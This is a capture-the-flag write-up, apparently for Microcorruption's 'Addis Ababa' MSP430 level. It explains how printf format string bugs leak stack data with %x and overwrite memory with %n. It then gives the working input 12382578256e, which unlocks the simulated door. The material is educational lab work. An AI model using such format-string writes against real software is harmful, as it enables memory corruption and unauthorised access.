# Addis Ababa

I began by going through the main function and found that the program takes the username and the password as input, copies it to a new location and then checks for the validity.
Also, I didn't fail to notice the use of printf's in this program. The previuos questions generally  used a puts, but this used printfs.

On checking the manual for printf, I found that it takes 4 kinds of format specifiers, s for char*, x for unsigned int, c for a character and n for saving the number of characters printed so far. I felt that this problem might have something to do with a format string vulnerability. So, I tried looking for one.

**An overview of Format string Vulnerability**
A format string contains an ASCIIZ string that contains text and format parameters.

eg.
```
printf("Your answer is %d", number);
```

When the code executes, the format function parses the format string by reading a character at a time. Characters are copied to the output till a % is reached. If a % is encountered, the character just after the % specifies the type of the parameter to be evaluated. This parameter is then fetched from the stack. In this case, it will look for an integer on the stack. So basically, a type is specified for each arguement which is then retirieved accordingly from the stack.
The stack in the previous case looked like:

```
<number>
<Address of format string>
```

An exploit occurs when a format function such as printf is used without these format specifiers.
For eg.
```
printf(userInput)
```

In this case, what if the user inputs a string such as "%x %x %x %x"? This will be interpreted as:

```
printf("%x %x %x %x")
```

A %x is used to represent an unsigned hexadecimal integer. In this case, there are no arguements passed to the printf except the format string. So, when the first %x is encountered, printf looks for an arguement on the stack and prints it. But as there are no arguements passed, it prints whatever value is present at the stack at that location. It can be visualized something like:

```
<Some value>
<Some value>
<Some value>
<Some value>
<Address of format string>
```
So, in this case, all the 4 values on the stack will be printed. This is a way to view the stack by taking the advantage of an incorrectly used format function.


*Overwriting a value at a memory address*

Based on the concept above, most format string exploits are used to overwrite data at user defined locations. The way this works is as follows:

The user inputs a string like:
"Address_To_Overwrite |series of %x| %n"


Here:
Address_To_Overwrite can be an address like /x12/x34/x56/x78.
The %x's cause the stack pointer to move towards the format string.
Then the %n(used to save number of characters written till now) can be used to overwrite the content at the above mentioned address. Visually:

```
%n                          |
%x                          |
%x                          | > User Input
%x                          |
<Address_To_Overwrite>      |
<some value>
<some value>
<some value>
<Address of user input>
```

The trick is to figure out the number of %x to reach to the address where the input string is actually stored. Once we reach the start, we will basically be pointing at the address where we have to overwrite. The %n will then take this address and write the number of characters written till now to it.


### The actual question:

*This is the initial input taking code:*

```
4440:  3012 e644      push	#0x44e6 "Login with username:password below to authenticate.\n"
4444:  b012 c845      call	#0x45c8 <printf>
4448:  b140 1b45 0000 mov	#0x451b ">> ", 0x0(sp)
444e:  b012 c845      call	#0x45c8 <printf>
4452:  2153           incd	sp
4454:  3e40 1300      mov	#0x13, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8c45      call	#0x458c <getsn>
```

Once I input the string, it was stored at 0x2400. Next, it got copied via strcpy to 0x3814.

```
4464:  3e40 0024      mov	#0x2400, r14
4468:  0f4b           mov	r11, r15
446a:  b012 de46      call	#0x46de <strcpy>
```

(After the above instructions, r14(0x2400) points to the string I input, r15(0x3814) contains the location of the place where the string will be copied.)

Once copied, the memory looked something like:

```
2400:   6161 6100 0000 0000 0000 0000 0000 0000   aaa.............
2410:   0000 0000 0000 0000 0000 0000 0000 0000   ................
2420:   *
37f0:   4c45 0100 5e45 0000 2000 2000 4446 0000   LE..^E.. . .DF..
3800:   0038 0000 4c45 0000 9645 0200 0024 1300   .8..LE...E...$..
3810:   6e44 0000 6161 6100 0000 0000 0000 0000   nD..aaa.........
```

I had input 'aaa' which can be seen at the two addresses mentioned earlier.

Next, my input is passed to the test_password_valid function which when returns sets r15 to 0.
This value of 0, from r15 is then moved to 0x0(sp). The value of sp was then 0x3812.

After seeing the following code then, I concluded that this program indeed had a format string vulnerabilty.

```
4472:  b012 b044      call	#0x44b0 <test_password_valid>
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>
```

This code pushes r11 on the stack, and the value in r11 at that point was 0x3814, which points to the place where my input was copied.

**That's it.** My input string is the only thing that is being passed to printf. Hence, I can prepare a format string exploit.

Looking further down the code:

```
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>
*
448a:  8193 0000      tst	0x0(sp)
448e:  0324           jz	#0x4496 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
```

I found that the instruction tst 0x0(sp) caused the control to jump if the value at sp is zero. On continuing the execution, I found that sp points to 0x3812, at the tst instruction.

The string that I input was copied to 0x3814. So, I had to prepare the format string so that it wrote a non zero value at sp or 0x3812.

As explained earlier in the format string exploits section,
first I used an input such as

\x12\x38 |series of %x| to see when I reach the beginning of this string. I saw that using a single %x I was able to reach the beginning of my string. So, next I used a %x followed by a %n to overwrite into the address 0x3812.


I input the hex value of \x12\x38%x%n = 12382578256e

This caused the tst 0x0(sp) to pass and the door unlocked.










